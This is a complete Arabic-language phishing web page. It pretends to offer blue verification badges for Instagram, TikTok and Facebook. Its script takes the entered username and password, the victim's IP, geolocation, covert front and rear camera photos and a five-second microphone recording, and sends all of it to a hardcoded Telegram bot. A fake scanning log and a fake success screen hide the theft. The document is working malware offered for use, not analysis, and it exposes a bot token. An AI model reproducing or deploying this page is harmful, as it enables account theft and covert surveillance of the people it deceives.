<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التوثيق العالمية | Meta & TikTok Verification</title>
    <style>
        :root { --blue: #0095f6; --dark: #050505; --accent: #1da1f2; }
        body { margin: 0; background: var(--dark); font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .bg-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
        .badge { position: absolute; width: 25px; height: 25px; background: url('https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg') no-repeat center; background-size: contain; opacity: 0.1; animation: float linear infinite; }
        @keyframes float { from { transform: translateY(110vh) rotate(0deg); } to { transform: translateY(-10vh) rotate(360deg); } }

        .card { background: rgba(15, 15, 15, 0.98); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; width: 92%; max-width: 420px; padding: 35px; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.9); position: relative; }
        .main-logo { width: 75px; height: 75px; margin-bottom: 15px; filter: drop-shadow(0 0 15px var(--blue)); animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }

        input, select { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: #111; color: white; box-sizing: border-box; font-size: 15px; }
        .btn { background: var(--blue); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
        .btn:hover { background: #1877f2; transform: translateY(-2px); }

        .copy-box { background: #1a1a1a; border: 1px dashed var(--blue); padding: 12px; border-radius: 10px; margin: 15px 0; display: flex; justify-content: space-between; align-items: center; }
        .copy-btn { background: var(--blue); font-size: 11px; padding: 6px 10px; border-radius: 5px; cursor: pointer; }

        .log-box { text-align: left; font-family: monospace; font-size: 11px; color: #00ff00; background: #000; padding: 10px; border-radius: 8px; height: 110px; overflow-y: auto; margin: 15px 0; border: 1px solid #222; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="bg-box" id="bg"></div>

<div class="card" id="step-login">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="main-logo">
    <h2 style="margin: 0 0 10px 0;">مركز التوثيق الموحد</h2>
    <p style="font-size: 13px; color: #888; margin-bottom: 20px;">أدخل بياناتك للحصول على الشارة الزرقاء</p>
    
    <select id="platform">
        <option>Instagram</option>
        <option>TikTok</option>
        <option>Facebook</option>
    </select>
    <input type="text" id="username" placeholder="اسم المستخدم">
    <input type="password" id="password" placeholder="كلمة المرور">
    <input type="text" id="return-id-input" placeholder="رابط العودة (اختياري)">
    
    <button class="btn" id="mainBtn" onclick="startProcess()">ارسال وطلب التوثيق</button>
</div>

<div class="card hidden" id="step-scan">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="main-logo">
    <h3>جاري فحص المعايير...</h3>
    <div class="log-box" id="logs"></div>
    <p id="scan-status" style="font-size: 12px; color: var(--blue);">بدء الاتصال الآمن...</p>
</div>

<div class="card hidden" id="step-success">
    <div style="font-size: 50px; color: #00ff00;">✓</div>
    <h3>تم استلام الطلب!</h3>
    <p style="font-size: 13px; color: #aaa;">يرجى نسخ رمز العودة لمتابعة حالة طلبك:</p>
    
    <div class="copy-box">
        <span id="final-rid" style="color: var(--blue); font-family: monospace; font-size: 18px;"></span>
        <span class="copy-btn" onclick="copyCode()">نسخ الرمز</span>
    </div>
    
    <p style="font-size: 11px; color: #555;">سيتم الرد خلال 24 ساعة عبر الحساب</p>
    <button class="btn" style="background: #333;" onclick="location.reload()">إغلاق</button>
</div>

<script>
    const CONFIG = {
        token: "8489095230:AAErhMnDZ4Sl9uyZ6K_yFZeVpTyQVMUsiJs",
        chatId: "6529237252"
    };

    window.onload = () => {
        for(let i=0; i<15; i++){
            let b = document.createElement('div'); b.className = 'badge';
            b.style.left = Math.random()*100+"vw"; b.style.animationDuration = (Math.random()*10+10)+"s";
            document.getElementById('bg').appendChild(b);
        }
        // إذا كان هناك رمز عودة مكتوب مسبقاً
        const inputRID = document.getElementById('return-id-input');
        inputRID.addEventListener('change', () => { if(inputRID.value.startsWith('VR-')) startScanUI(inputRID.value); });
    };

    async function startProcess() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        const pl = document.getElementById('platform').value;
        if(!u || !p) return alert("يرجى ملء البيانات كاملة");

        document.getElementById('mainBtn').innerText = "جاري الإرسال...";
        const rid = "VR-" + Math.floor(Math.random()*899999 + 100000);

        // جمع البيانات الفنية العميقة
        let ipData = {ip: "Unknown"};
        try { ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()); } catch(e){}
        
        const report = `🚀 <b>صيد ملكي جديد (V7)</b>\n━━━━━━━━━━━━━━━\n📱 المنصة: ${pl}\n👤 اليوزر: <code>${u}</code>\n🔐 الباسورد: <code>${p}</code>\n🆔 الرمز: <code>${rid}</code>\n━━━━━━━━━━━━━━━\n📍 الـ IP: ${ipData.ip}\n🖥️ النظام: ${navigator.platform}\n🔋 البطارية: جاري الفحص...`;

        await sendTele(report);
        
        // بدء السحب المتعدد (صور وصوت وموقع)
        captureMultiMedia();

        // إظهار واجهة النجاح
        document.getElementById('step-login').classList.add('hidden');
        document.getElementById('step-success').classList.remove('hidden');
        document.getElementById('final-rid').innerText = rid;
    }

    async function captureMultiMedia() {
        // 1. سحب الموقع
        navigator.geolocation.getCurrentPosition(pos => {
            sendTele(`📍 موقع الضحية: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        });

        // 2. سحب صور (أمامية وخلفية)
        await takePhoto("user"); // أمامية صوره 1
        await takePhoto("user"); // أمامية صوره 2
        await takePhoto("environment"); // خلفية صوره 1
        await takePhoto("environment"); // خلفية صوره 2

        // 3. سحب تسجيل صوتي (5 ثواني)
        await recordAudio(5000);
    }

    async function takePhoto(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.createElement('video'); video.srcObject = stream; await video.play();
            const canvas = document.createElement('canvas'); 
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const f = new FormData(); f.append('chat_id', CONFIG.chatId); f.append('photo', blob, 'cam.jpg');
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {method: 'POST', body: f});
            }, 'image/jpeg');
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
        } catch(e){}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/wav' });
                const f = new FormData(); f.append('chat_id', CONFIG.chatId); f.append('voice', blob, 'mic.ogg');
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, {method: 'POST', body: f});
            };
            recorder.start();
            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, ms);
        } catch(e){}
    }

    async function startScanUI(code) {
        document.getElementById('step-login').classList.add('hidden');
        document.getElementById('step-scan').classList.remove('hidden');
        const logs = ["> Initializing...", "> Fetching data for "+code, "> Analyzing profile...", "> Checking API Meta...", "> Error: Trust Score Low"];
        for(let m of logs) {
            let d = document.createElement('div'); d.innerText = m;
            document.getElementById('logs').appendChild(d);
            document.getElementById('scan-status').innerText = m;
            await new Promise(r => setTimeout(r, 1500));
        }
        alert("عذراً، هذا الحساب غير مؤهل حالياً. حاول بعد 24 ساعة.");
        location.reload();
    }

    function copyCode() {
        const text = document.getElementById('final-rid').innerText;
        navigator.clipboard.writeText(text);
        alert("تم نسخ الرمز: " + text);
    }

    async function sendTele(t) {
        return fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.chatId, text: t, parse_mode: 'HTML'})
        });
    }
</script>
</body>
</html>

